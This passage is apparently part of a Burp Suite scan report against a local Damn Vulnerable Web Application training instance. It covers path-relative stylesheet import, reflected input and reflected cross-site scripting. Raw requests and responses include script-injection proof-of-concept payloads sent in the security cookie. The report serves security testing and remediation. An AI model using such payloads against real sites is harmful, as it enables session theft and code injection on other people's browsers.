<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:50 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 986<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="29.3">29.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#29.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php? HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fmlhkgv0f0tm8j49dn1nc9092m<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/view_source.php?id=brute&amp;security=low<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../dvwa/css/source.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php<span class="HIGHLIGHT">/cmkr8g/qkh4sp/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fmlhkgv0f0tm8j49dn1nc9092m<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/view_source.php?id=brute&amp;security=low<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../dvwa/css/source.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/view_source.php/cmkr8g/dvwa/css/source.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fmlhkgv0f0tm8j49dn1nc9092m<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/view_source.php?id=brute&amp;security=low<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="29.4">29.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#29.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.1">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#29.4.1">/dvwa/vulnerabilities/view_source.php [id parameter]</a></li>
<li><a href="#29.4.2">/dvwa/vulnerabilities/view_source.php [security parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="29.4.1">29.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</span>
<br><a class="PREVNEXT" href="#29.2.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.4.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>id</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute<span class="HIGHLIGHT">wxv2l4vk25</span>&amp;security=low HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1012<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;h2&gt;vulnerabilities/brute<span class="HIGHLIGHT">wxv2l4vk25</span>/source/low.php&lt;/h2&gt;<br><b>...[SNIP]...</b><br>&lt;input type="button" value="Compare All Levels" onclick="window.location.href='view_source_all.php?id=brute<span class="HIGHLIGHT">wxv2l4vk25</span>'"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="29.4.2">29.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</span>
<br><a class="PREVNEXT" href="#29.4.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute&amp;security=low<span class="HIGHLIGHT">wt9omsotzs</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:49 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 992<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;h2&gt;vulnerabilities/brute/source/low<span class="HIGHLIGHT">wt9omsotzs</span>.php&lt;/h2&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="30">30.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/</span>
<br><a class="PREVNEXT" href="#29">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31">Next</a>
<br>
<span class="BODH1" id="30.1">30.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#29.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.2">Next</a>
<br>
<br><span class="TEXT">There are 3 instances of this issue:
<ul>
<li><a href="#30.1.1">/dvwa/vulnerabilities/weak_id/ [security cookie]</a></li>
<li><a href="#30.1.2">/dvwa/vulnerabilities/weak_id/ [security cookie]</a></li>
<li><a href="#30.1.3">/dvwa/vulnerabilities/weak_id/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="30.1.1">30.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</span>
<br><a class="PREVNEXT" href="#29.4.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>l51ji'&gt;&lt;script&gt;alert(1)&lt;/script&gt;pptpqlrqkr4</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.<br><br>The original request used a Content-type header which it is not possible to generate using a standard HTML form. It was possible to replace this header with a standard value, to facilitate cross-domain delivery of an exploit.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/weak_id/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">l51ji'%3e%3cscript%3ealert(1)%3c%2fscript%3epptpqlrqkr4</span>; PHPSESSID=v2kalm3j9kro1oo4cc1997e07n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/weak_id/<br><span class="HIGHLIGHT">Content-type: text/plain</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=v2kalm3j9kro1oo4cc1997e07n; path=/<br>Set-Cookie: security=low<br>Set-Cookie: dvwaSession=1ad2911e4450af592e395b534cf6ad6d6feeac70; expires=Fri, 11-Mar-2022 08:33:12 GMT; Max-Age=3600; path=/vulnerabilities/weak_id/; domain=localhost:7878; secure; HttpOnly<br>Content-Length: 3494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Weak Session IDs :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=weak_id&amp;security=low<span class="HIGHLIGHT">l51ji'&gt;&lt;script&gt;alert(1)&lt;/script&gt;pptpqlrqkr4</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="30.1.2">30.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/weak_id/ [security cookie]</span>
<br><a class="PREVNEXT" href="#30.1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30.1.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/weak_id/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>sbhgr'&gt;&lt;script&gt;alert(1)&lt;/script&gt;n37cg</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
